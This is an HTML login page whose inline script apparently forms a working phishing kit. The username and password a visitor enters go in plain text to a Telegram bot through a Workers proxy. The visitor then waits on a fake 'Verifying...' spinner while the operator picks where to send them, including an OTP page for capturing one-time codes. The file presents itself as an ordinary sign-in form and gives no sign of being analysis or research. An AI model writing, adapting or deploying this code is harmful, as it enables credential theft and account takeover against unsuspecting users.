<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
  <style>
    body { font-family: sans-serif; display:flex; justify-content:center;
           align-items:center; height:100vh; background:#111; color:#fff; }
    .box { background:#222; padding:30px; border-radius:10px; width:300px; }
    input, button { width:100%; padding:10px; margin:8px 0; border-radius:6px;
                    border:none; box-sizing:border-box; }
    button { background:#0088cc; color:#fff; cursor:pointer; }
    .spinner { border:4px solid #444; border-top:4px solid #fff; border-radius:50%;
               width:36px; height:36px; animation:spin 1s linear infinite;
               margin:20px auto; }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
<div class="box">
  <div id="form">
    <h2>Sign in</h2>
    <input id="user" placeholder="Username">
    <input id="pass" type="password" placeholder="Password">
    <button onclick="submitLogin()">Login</button>
  </div>
  <div id="waiting" style="display:none; text-align:center;">
    <p>Verifying...</p>
    <div class="spinner"></div>
  </div>
</div>

<script>
const PROXY   = "https://telegram-proxy.wyldamcmur.workers.dev";
const CHAT_ID = "7344364597";

const ROUTES = {
  "otp":"otp.html", "forgot":"forgot.html", "login":"login.html",
  "success":"dashboard.html", "block":"blocked.html"
};

async function submitLogin() {
  const user = document.getElementById("user").value;
  const pass = document.getElementById("pass").value;

  document.getElementById("form").style.display    = "none";
  document.getElementById("waiting").style.display = "block";

  const sid = crypto.randomUUID().slice(0, 8);

  const keyboard = {
    inline_keyboard: [
      [{ text:"🔐 OTP",       callback_data:`otp:${sid}`     }],
      [{ text:"🔑 Forgot",    callback_data:`forgot:${sid}`  }],
      [{ text:"↩️ Login",     callback_data:`login:${sid}`   }],
      [{ text:"✅ Dashboard", callback_data:`success:${sid}` }],
      [{ text:"🚫 Block",     callback_data:`block:${sid}`   }]
    ]
  };

  // get current offset
  const r0 = await fetch(`${PROXY}/getUpdates?offset=-1`);
  const d0 = await r0.json();
  const startOffset = d0.result && d0.result.length
    ? d0.result[d0.result.length - 1].update_id + 1
    : 0;

  // send login + buttons
  await fetch(`${PROXY}/sendMessage`, {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: `🔔 Login attempt\n👤 ${user}\n🔑 ${pass}\nSession: ${sid}`,
      reply_markup: keyboard
    })
  });

  pollLoop(startOffset, sid);
}

async function pollLoop(offset, sid) {
  while (true) {
    try {
      const r = await fetch(`${PROXY}/getUpdates?offset=${offset}&timeout=15`);
      const data = await r.json();
      if (!data.result) continue;

      for (const upd of data.result) {
        offset = upd.update_id + 1;
        const cb = upd.callback_query;
        if (!cb) continue;

        const [action, sess] = cb.data.split(":");
        if (sess !== sid) continue;

        await fetch(`${PROXY}/answerCallbackQuery`, {
          method: "POST",
          headers: {"Content-Type":"application/json"},
          body: JSON.stringify({
            callback_query_id: cb.id,
            text: "Redirecting user..."
          })
        });

        window.location.href = ROUTES[action] || "login.html";
        return;
      }
    } catch (e) {
      console.error(e);
      await new Promise(r => setTimeout(r, 2000));
    }
  }
}
</script>
</body>
</html>
